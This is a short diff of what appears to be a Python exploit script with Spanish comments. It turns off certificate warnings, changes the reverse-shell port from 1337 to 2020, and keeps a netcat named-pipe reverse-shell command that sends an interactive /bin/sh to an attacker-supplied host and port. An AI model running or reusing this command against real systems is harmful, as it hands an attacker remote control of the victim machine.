@@ -9,7 +9,7 @@ import hashlib
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Puerto para la conexión inversa
-REVERSE_SHELL_PORT = 1337
+REVERSE_SHELL_PORT = 2020
 
 # Comando de shell inversa a ejecutar
 REVERSE_SHELL_COMMAND = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
